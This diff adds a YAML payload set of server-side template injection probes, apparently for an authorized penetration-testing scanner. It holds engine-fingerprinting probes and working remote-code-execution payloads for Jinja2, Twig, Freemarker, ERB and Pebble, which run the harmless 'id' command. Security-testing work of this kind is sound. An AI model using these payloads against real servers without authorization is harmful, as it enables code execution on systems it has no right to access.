@@ -1,0 +1,155 @@
+# Curated Server-Side Template Injection probes for authorized testing.
+#
+# Category taxonomy used by PayloadMutator.mutate_by_category:
+#   ssti_fingerprint — arithmetic-disambiguation probes for engine ID.
+#                      ``prerequisites.expected`` carries the literal substring
+#                      the specialist looks for in the response body.
+#                      When the engine can be pinned from the expected output
+#                      alone (e.g. ``{{7*'7'}}`` -> ``7777777`` is Jinja2-only),
+#                      ``prerequisites.engine`` names the winning engine.
+#   ssti_exploit     — engine-specific exploitation payloads. ``prerequisites.
+#                      engine`` selects the right family; ``prerequisites.marker``
+#                      is the deterministic substring the specialist looks for
+#                      in the response to treat the probe as verified.
+#
+# Markers are deliberately boring ASCII tokens (e.g. ``penage_marker_XXX``) so
+# CI logs stay grep-able without noisy shell metacharacters.
+
+# ---------------------------------------------------------------------------
+# Phase 1: engine fingerprinting
+# ---------------------------------------------------------------------------
+- id: ssti-fp-double-brace-arith
+  context: ssti_fingerprint
+  prerequisites:
+    expected: "49"
+  template: "{{7*7}}"
+  description: "Jinja2 / Twig / Nunjucks: ``{{7*7}}`` -> 49."
+
+- id: ssti-fp-dollar-arith
+  context: ssti_fingerprint
+  prerequisites:
+    expected: "49"
+  template: "${7*7}"
+  description: "Freemarker / Velocity: ``${7*7}`` -> 49."
+
+- id: ssti-fp-erb-arith
+  context: ssti_fingerprint
+  prerequisites:
+    engine: erb
+    expected: "49"
+  template: "<%= 7*7 %>"
+  description: "Ruby ERB: ``<%= 7*7 %>`` -> 49."
+
+- id: ssti-fp-pebble-arith
+  context: ssti_fingerprint
+  prerequisites:
+    engine: pebble
+    expected: "49"
+  template: "#{7*7}"
+  description: "Pebble (Java): ``#{7*7}`` -> 49."
+
+- id: ssti-fp-jinja-string-mul
+  context: ssti_fingerprint
+  prerequisites:
+    engine: jinja2
+    expected: "7777777"
+  template: "{{7*'7'}}"
+  description: "Jinja2 only: ``7*'7'`` repeats the string 7 times -> ``7777777``."
+
+- id: ssti-fp-twig-string-mul
+  context: ssti_fingerprint
+  prerequisites:
+    engine: twig
+    expected: "49"
+    disambiguator: "{{7*'7'}}"
+  template: "{{7*'7'}}"
+  description: "Twig: ``7*'7'`` coerces and multiplies -> 49."
+
+# ---------------------------------------------------------------------------
+# Phase 2: engine-specific exploitation
+# ---------------------------------------------------------------------------
+
+# --- Jinja2 ----------------------------------------------------------------
+- id: ssti-exp-jinja-config
+  context: ssti_exploit
+  prerequisites:
+    engine: jinja2
+    marker: "penage_jinja_cfg"
+  template: "{{config.__class__.__name__}}penage_jinja_cfg"
+  description: "Leaks the Flask Config class name — unauthenticated RCE surface check."
+
+- id: ssti-exp-jinja-popen
+  context: ssti_exploit
+  prerequisites:
+    engine: jinja2
+    marker: "penage_jinja_rce"
+  template: "{{''.__class__.__mro__[1].__subclasses__()}}penage_jinja_rce"
+  description: "Introspects subclasses — precursor to a Popen gadget chain."
+
+- id: ssti-exp-jinja-self
+  context: ssti_exploit
+  prerequisites:
+    engine: jinja2
+    marker: "penage_jinja_self"
+  template: "{{self.__init__.__globals__['__builtins__']}}penage_jinja_self"
+  description: "Reaches builtins via the environment; high-signal RCE indicator."
+
+# --- Twig ------------------------------------------------------------------
+- id: ssti-exp-twig-filter-exec
+  context: ssti_exploit
+  prerequisites:
+    engine: twig
+    marker: "penage_twig_exec"
+  template: "{{['id']|filter('system')}}penage_twig_exec"
+  description: "Twig system() via array filter; marker co-located for evidence."
+
+- id: ssti-exp-twig-getenv
+  context: ssti_exploit
+  prerequisites:
+    engine: twig
+    marker: "penage_twig_env"
+  template: "{{_self.env.getFilter('system').getCallable()('id')}}penage_twig_env"
+  description: "Twig environment gadget for command execution."
+
+# --- Freemarker ------------------------------------------------------------
+- id: ssti-exp-freemarker-exec
+  context: ssti_exploit
+  prerequisites:
+    engine: freemarker
+    marker: "penage_fm_exec"
+  template: "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}penage_fm_exec"
+  description: "Freemarker classic Execute utility for RCE."
+
+- id: ssti-exp-freemarker-objectc
+  context: ssti_exploit
+  prerequisites:
+    engine: freemarker
+    marker: "penage_fm_oc"
+  template: "<#assign oc=\"freemarker.template.utility.ObjectConstructor\"?new()>${oc(\"java.lang.ProcessBuilder\",[\"id\"]).start()}penage_fm_oc"
+  description: "Freemarker ObjectConstructor -> ProcessBuilder chain."
+
+# --- ERB -------------------------------------------------------------------
+- id: ssti-exp-erb-backtick
+  context: ssti_exploit
+  prerequisites:
+    engine: erb
+    marker: "penage_erb_bt"
+  template: "<%= `id` %>penage_erb_bt"
+  description: "Ruby backtick command substitution inside ERB output tag."
+
+- id: ssti-exp-erb-system
+  context: ssti_exploit
+  prerequisites:
+    engine: erb
+    marker: "penage_erb_sys"
+  template: "<% system('id') %>penage_erb_sys"
+  description: "Ruby ERB code tag invoking system()."
+
+# --- Pebble ----------------------------------------------------------------
+- id: ssti-exp-pebble-rce
+  context: ssti_exploit
+  prerequisites:
+    engine: pebble
+    marker: "penage_pebble_rce"
+  template: "{{'test'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}penage_pebble_rce"
+  description: "Pebble Java reflection -> Runtime.exec()."
